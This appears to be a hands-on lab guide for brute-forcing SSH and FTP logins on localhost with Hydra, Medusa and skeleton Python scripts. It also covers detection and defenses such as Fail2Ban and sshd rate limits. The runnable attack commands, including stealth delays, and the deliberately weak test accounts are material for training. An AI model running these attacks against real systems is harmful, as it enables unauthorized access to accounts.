@@ -1,0 +1,586 @@
+ Crack SSH/FTP Credentials Using Hydra
+Objectives
+By the end of this lab, students will be able to:
+
+Perform brute-force attacks against SSH services using Hydra
+Execute FTP credential cracking with Medusa
+Create Python scripts to automate credential testing
+Analyze attack results and understand detection methods
+Implement defensive measures against brute-force attacks
+Prerequisites
+Basic Linux command line proficiency
+Understanding of SSH and FTP protocols
+Python programming fundamentals
+Familiarity with network security concepts
+Lab Environment Setup
+Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux environments. Click Start Lab to access your machine with:
+
+Ubuntu 20.04 LTS
+Hydra and Medusa pre-installed
+Python 3.8+ with required libraries
+Local SSH and FTP services configured
+Sample wordlists included
+Task 1: SSH Brute-Force with Hydra
+Step 1.1: Verify Installation and Setup
+# Check Hydra installation
+hydra -h
+
+# Verify SSH service is running
+sudo systemctl status ssh
+
+# If SSH is not running, start it
+sudo systemctl start ssh
+Step 1.2: Create Test Environment
+# Create test users with weak passwords
+sudo useradd -m testuser1
+sudo useradd -m admin
+echo 'testuser1:password123' | sudo chpasswd
+echo 'admin:admin' | sudo chpasswd
+
+# Create wordlist directory
+mkdir ~/wordlists
+cd ~/wordlists
+
+# Create username wordlist
+cat > usernames.txt << EOF
+admin
+testuser1
+root
+user
+guest
+EOF
+
+# Create password wordlist
+cat > passwords.txt << EOF
+admin
+password
+123456
+password123
+root
+test
+EOF
+Step 1.3: Execute Basic Hydra Attacks
+# Single credential test
+hydra -l admin -p admin ssh://127.0.0.1
+
+# Wordlist-based attack
+hydra -L ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt ssh://127.0.0.1
+
+# Verbose output with threading control
+hydra -L ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -t 4 -V ssh://127.0.0.1
+
+# Save results to file
+hydra -L ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -o ssh_results.txt ssh://127.0.0.1
+Step 1.4: Advanced Hydra Options
+# Add delay between attempts (stealth mode)
+hydra -L ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -t 2 -w 3 ssh://127.0.0.1
+
+# Custom port specification
+hydra -L ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -s 2222 ssh://127.0.0.1
+
+# Resume interrupted attack
+hydra -L ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -R ssh://127.0.0.1
+Task 2: FTP Brute-Force with Medusa
+Step 2.1: Configure FTP Service
+# Install FTP server
+sudo apt install vsftpd -y
+
+# Configure vsftpd for testing
+sudo tee /etc/vsftpd.conf > /dev/null << EOF
+listen=YES
+local_enable=YES
+write_enable=YES
+chroot_local_user=YES
+allow_writeable_chroot=YES
+EOF
+
+# Restart FTP service
+sudo systemctl restart vsftpd
+sudo systemctl enable vsftpd
+Step 2.2: Install and Verify Medusa
+# Install Medusa
+sudo apt install medusa -y
+
+# View help and available modules
+medusa -h
+medusa -d
+Step 2.3: Execute Medusa Attacks
+# Basic FTP attack
+medusa -h 127.0.0.1 -u testuser1 -p password123 -M ftp
+
+# Wordlist attack with verbose output
+medusa -h 127.0.0.1 -U ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -M ftp -v 6
+
+# Save results and control threading
+medusa -h 127.0.0.1 -U ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -M ftp -t 5 -O ftp_results.txt
+
+# Resume attack from checkpoint
+medusa -h 127.0.0.1 -U ~/wordlists/usernames.txt -P ~/wordlists/passwords.txt -M ftp -Z h1u1p1
+Task 3: Automate Attacks with Python
+Step 3.1: SSH Brute-Force Script Template
+Create ssh_bruteforce.py:
+
+#!/usr/bin/env python3
+"""
+SSH Brute-Force Tool
+Students: Complete the TODO sections to implement functionality
+"""
+
+import paramiko
+import sys
+import threading
+from queue import Queue
+
+class SSHBruteForcer:
+    def __init__(self, target, port=22, threads=10):
+        self.target = target
+        self.port = port
+        self.threads = threads
+        self.found_credentials = []
+        self.queue = Queue()
+        
+    def ssh_connect(self, username, password):
+        """
+        Attempt SSH connection with given credentials
+        
+        Args:
+            username: SSH username to test
+            password: SSH password to test
+            
+        Returns:
+            bool: True if authentication successful, False otherwise
+        """
+        # TODO: Create SSH client using paramiko
+        # TODO: Set missing host key policy to AutoAddPolicy
+        # TODO: Attempt connection with timeout=5
+        # TODO: Close connection if successful
+        # TODO: Return True on success, False on AuthenticationException
+        # TODO: Handle other exceptions appropriately
+        pass
+    
+    def worker(self):
+        """
+        Worker thread to process credential queue
+        """
+        # TODO: Loop while queue is not empty
+        # TODO: Get username and password from queue
+        # TODO: Test credentials using ssh_connect
+        # TODO: If successful, add to found_credentials list
+        # TODO: Mark queue task as done
+        pass
+    
+    def load_wordlist(self, filename):
+        """
+        Load wordlist from file
+        
+        Args:
+            filename: Path to wordlist file
+            
+        Returns:
+            list: List of words from file
+        """
+        # TODO: Open and read file
+        # TODO: Strip whitespace from each line
+        # TODO: Return list of words
+        # TODO: Handle FileNotFoundError
+        pass
+    
+    def run_attack(self, usernames_file, passwords_file):
+        """
+        Execute brute-force attack
+        
+        Args:
+            usernames_file: Path to username wordlist
+            passwords_file: Path to password wordlist
+        """
+        # TODO: Load username and password wordlists
+        # TODO: Fill queue with all username/password combinations
+        # TODO: Create and start worker threads
+        # TODO: Wait for queue to complete
+        # TODO: Display results
+        pass
+
+if __name__ == "__main__":
+    # TODO: Parse command line arguments
+    # TODO: Create SSHBruteForcer instance
+    # TODO: Run attack
+    pass
+Installation and Usage:
+
+# Install required library
+pip3 install paramiko
+
+# Make script executable
+chmod +x ssh_bruteforce.py
+
+# Run the script (after completing TODO sections)
+python3 ssh_bruteforce.py 127.0.0.1 ~/wordlists/usernames.txt ~/wordlists/passwords.txt
+Step 3.2: FTP Brute-Force Script Template
+Create ftp_bruteforce.py:
+
+#!/usr/bin/env python3
+"""
+FTP Brute-Force Tool
+Students: Complete the TODO sections to implement functionality
+"""
+
+import ftplib
+import sys
+import threading
+import time
+from queue import Queue
+
+class FTPBruteForcer:
+    def __init__(self, target, port=21, threads=10):
+        self.target = target
+        self.port = port
+        self.threads = threads
+        self.found_credentials = []
+        self.queue = Queue()
+        
+    def ftp_connect(self, username, password):
+        """
+        Attempt FTP connection with given credentials
+        
+        Args:
+            username: FTP username to test
+            password: FTP password to test
+            
+        Returns:
+            bool: True if authentication successful, False otherwise
+        """
+        # TODO: Create FTP object
+        # TODO: Connect to target with timeout=10
+        # TODO: Attempt login with credentials
+        # TODO: Quit connection if successful
+        # TODO: Return True on success, False on error_perm
+        # TODO: Handle other exceptions
+        pass
+    
+    def worker(self):
+        """
+        Worker thread to process credential queue
+        """
+        # TODO: Implement similar to SSH worker
+        # TODO: Add small delay (0.1s) between attempts
+        pass
+    
+    def load_wordlist(self, filename):
+        """
+        Load wordlist from file
+        """
+        # TODO: Implement file loading
+        pass
+    
+    def run_attack(self, usernames_file, passwords_file):
+        """
+        Execute brute-force attack
+        """
+        # TODO: Implement attack execution
+        pass
+
+if __name__ == "__main__":
+    # TODO: Parse arguments and run attack
+    pass
+Step 3.3: Multi-Service Attack Script Template
+Create multi_bruteforce.py:
+
+#!/usr/bin/env python3
+"""
+Multi-Service Brute-Force Tool
+Students: Extend this to support both SSH and FTP
+"""
+
+import argparse
+import sys
+
+class MultiServiceBruteForcer:
+    def __init__(self, target, service, port=None, threads=10):
+        """
+        Initialize multi-service brute-forcer
+        
+        Args:
+            target: Target IP or hostname
+            service: Service type ('ssh' or 'ftp')
+            port: Custom port (optional)
+            threads: Number of concurrent threads
+        """
+        # TODO: Initialize instance variables
+        # TODO: Set default ports based on service
+        pass
+    
+    def ssh_connect(self, username, password):
+        """Test SSH credentials"""
+        # TODO: Implement SSH connection test
+        pass
+    
+    def ftp_connect(self, username, password):
+        """Test FTP credentials"""
+        # TODO: Implement FTP connection test
+        pass
+    
+    def test_credentials(self, username, password):
+        """
+        Test credentials based on service type
+        
+        Returns:
+            bool: True if credentials valid
+        """
+        # TODO: Call appropriate connection method based on self.service
+        pass
+    
+    def worker(self):
+        """Worker thread for testing credentials"""
+        # TODO: Implement worker logic
+        pass
+    
+    def run_attack(self, usernames_file, passwords_file, output_file=None):
+        """
+        Execute attack and optionally save results
+        """
+        # TODO: Load wordlists
+        # TODO: Fill queue with combinations
+        # TODO: Start worker threads
+        # TODO: Wait for completion
+        # TODO: Display and save results
+        pass
+
+def main():
+    """Parse arguments and execute attack"""
+    # TODO: Create argument parser with required arguments:
+    #   - target, service, usernames, passwords
+    #   - Optional: port, threads, output
+    # TODO: Create MultiServiceBruteForcer instance
+    # TODO: Run attack
+    pass
+
+if __name__ == "__main__":
+    main()
+Step 3.4: Results Analyzer Template
+Create attack_analyzer.py:
+
+#!/usr/bin/env python3
+"""
+Attack Results Analyzer
+Students: Implement parsing and analysis functions
+"""
+
+import json
+from datetime import datetime
+
+class AttackAnalyzer:
+    def __init__(self):
+        self.results = {}
+    
+    def parse_hydra_output(self, filename):
+        """
+        Parse Hydra output file
+        
+        Args:
+            filename: Path to Hydra results file
+            
+        Returns:
+            list: List of (username, password) tuples
+        """
+        # TODO: Open and read file
+        # TODO: Look for lines containing 'login:' and 'password:'
+        # TODO: Extract credentials
+        # TODO: Return list of tuples
+        pass
+    
+    def parse_medusa_output(self, filename):
+        """Parse Medusa output file"""
+        # TODO: Implement Medusa output parsing
+        pass
+    
+    def parse_custom_output(self, filename):
+        """Parse custom script output"""
+        # TODO: Implement custom format parsing
+        pass
+    
+    def analyze_passwords(self, passwords):
+        """
+        Analyze password patterns
+        
+        Returns:
+            dict: Analysis results including frequency, length distribution
+        """
+        # TODO: Count password frequencies
+        # TODO: Analyze password lengths
+        # TODO: Return analysis dictionary
+        pass
+    
+    def generate_report(self, credentials, output_file):
+        """
+        Generate JSON report
+        
+        Args:
+            credentials: List of found credentials
+            output_file: Path to save report
+        """
+        # TODO: Create report dictionary with timestamp
+        # TODO: Include credential list and analysis
+        # TODO: Save as JSON file
+        pass
+
+def main():
+    # TODO: Parse command line arguments
+    # TODO: Create analyzer instance
+    # TODO: Process result files
+    # TODO: Generate report
+    pass
+
+if __name__ == "__main__":
+    main()
+Task 4: Defense and Detection
+Step 4.1: Monitor Failed Login Attempts
+# View recent failed SSH attempts
+sudo grep "Failed password" /var/log/auth.log | tail -20
+
+# Count failed attempts by IP
+sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
+
+# Monitor real-time authentication attempts
+sudo tail -f /var/log/auth.log
+Step 4.2: Implement Fail2Ban
+# Install Fail2Ban
+sudo apt install fail2ban -y
+
+# Create SSH jail configuration
+sudo tee /etc/fail2ban/jail.local > /dev/null << EOF
+[sshd]
+enabled = true
+port = ssh
+filter = sshd
+logpath = /var/log/auth.log
+maxretry = 3
+bantime = 3600
+findtime = 600
+EOF
+
+# Restart Fail2Ban
+sudo systemctl restart fail2ban
+
+# Check banned IPs
+sudo fail2ban-client status sshd
+Step 4.3: Configure Rate Limiting
+# Edit SSH configuration
+sudo nano /etc/ssh/sshd_config
+
+# Add these lines (students should add):
+# MaxAuthTries 3
+# MaxSessions 2
+# LoginGraceTime 30
+
+# Restart SSH service
+sudo systemctl restart ssh
+Step 4.4: Create Detection Script Template
+Create detect_bruteforce.py:
+
+#!/usr/bin/env python3
+"""
+Brute-Force Detection Script
+Students: Implement detection logic
+"""
+
+import re
+from collections import defaultdict
+from datetime import datetime, timedelta
+
+def parse_auth_log(logfile='/var/log/auth.log'):
+    """
+    Parse authentication log for failed attempts
+    
+    Returns:
+        dict: IP addresses with failed attempt counts
+    """
+    # TODO: Open and read log file
+    # TODO: Use regex to extract failed login attempts
+    # TODO: Count attempts per IP address
+    # TODO: Return dictionary of IP: count
+    pass
+
+def detect_attacks(failed_attempts, threshold=5):
+    """
+    Detect potential brute-force attacks
+    
+    Args:
+        failed_attempts: Dictionary of IP: count
+        threshold: Minimum attempts to consider attack
+        
+    Returns:
+        list: IPs exceeding threshold
+    """
+    # TODO: Filter IPs exceeding threshold
+    # TODO: Return list of suspicious IPs
+    pass
+
+def generate_alert(suspicious_ips):
+    """
+    Generate alert for detected attacks
+    """
+    # TODO: Format and display alert message
+    # TODO: Include timestamp and IP list
+    pass
+
+if __name__ == "__main__":
+    # TODO: Parse log file
+    # TODO: Detect attacks
+    # TODO: Generate alerts
+    pass
+Expected Outcomes
+After completing this lab, you should have:
+
+Successfully cracked test credentials using Hydra and Medusa
+Created functional Python scripts for automated credential testing
+Analyzed attack results and identified patterns
+Implemented basic defensive measures
+Understanding of brute-force attack detection methods
+Verification Steps:
+
+# Check if credentials were found
+cat ssh_results.txt
+cat ftp_results.txt
+
+# Test found credentials manually
+ssh testuser1@127.0.0.1
+
+# Verify Fail2Ban is active
+sudo fail2ban-client status
+Troubleshooting Tips
+Issue: Hydra connection timeout
+
+Solution: Verify SSH service is running: sudo systemctl status ssh
+Reduce thread count: Use -t 2 instead of -t 4
+Issue: Permission denied errors
+
+Solution: Ensure test users exist: cat /etc/passwd | grep testuser
+Reset passwords: echo 'testuser1:password123' | sudo chpasswd
+Issue: Python script import errors
+
+Solution: Install required libraries: pip3 install paramiko
+Verify Python version: python3 --version (should be 3.6+)
+Issue: FTP connection refused
+
+Solution: Check vsftpd status: sudo systemctl status vsftpd
+Review configuration: sudo cat /etc/vsftpd.conf
+Issue: No results found
+
+Solution: Verify credentials exist in wordlists
+Test manually first: ssh testuser1@127.0.0.1
+Conclusion
+This lab demonstrated practical brute-force attack techniques using industry-standard tools (Hydra, Medusa) and custom Python scripts. You learned to automate credential testing, analyze results, and implement defensive measures. Understanding these attack vectors is crucial for securing systems against unauthorized access attempts.
+
+Key Takeaways:
+
+Brute-force attacks are detectable through log analysis
+Rate limiting and account lockout policies are effective defenses
+Automated tools significantly increase attack efficiency
+Strong password policies are essential security controls
+Next Steps:
+
+Research advanced evasion techniques
+Explore password cracking with hashcat
+Study multi-factor authentication implementations
+Practice on authorized penetration testing platforms
+Ethical Reminder: Only perform these techniques on systems you own or have explicit written permission to test. Unauthorized access attempts are illegal and unethical.
